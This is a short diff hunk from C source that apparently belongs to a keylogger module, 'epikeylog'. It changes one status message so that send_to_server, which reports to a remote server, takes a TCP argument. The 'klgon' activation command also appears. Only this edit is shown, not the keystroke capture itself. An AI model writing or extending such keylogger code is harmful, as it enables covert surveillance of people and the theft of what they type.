@@ -257,7 +257,7 @@ int epikeylog_send_to_server(void) {
     if (!is_running) {
         DBG_MSG("epikeylog_send_to_server: not running\n");
 
-        send_to_server("epikeylog_send_to_server: not running. Activate it with `klgon`.\n");
+        send_to_server(TCP, "epikeylog_send_to_server: not running. Activate it with `klgon`.\n");
 
         return -EBUSY;
     }
